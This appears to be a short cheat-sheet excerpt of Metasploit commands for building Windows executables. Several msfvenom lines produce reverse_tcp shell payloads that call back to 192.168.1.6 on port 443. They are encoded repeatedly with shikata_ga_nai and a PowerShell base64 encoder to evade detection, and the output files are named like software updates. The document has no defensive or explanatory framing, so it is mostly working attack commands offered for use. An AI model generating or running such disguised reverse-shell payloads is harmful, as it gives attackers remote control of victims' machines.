...
### Generate EXE with bad characters and PowerShell encoder
     ...
     generate -f exe -b '\x00\x0a\x0d' -e 'cmd/powershell_base64' -o update2.exe


### Generate EXE with encoding and multiple iterations

    generate -f exe -b '\x00\x0a\x0d' -e 'cmd/powershell_base64' -o update3.exe -E -i 5
...
### Generate reverse shell EXE (encoded)
    ...
    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.6 LPORT=443 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f exe -o update2.exe
...
### Generate encoded reverse shell EXE
    ...
    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.6 LPORT=443 -a x86 --platform windows -b '\x00\xff\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f exe -o update5.exe
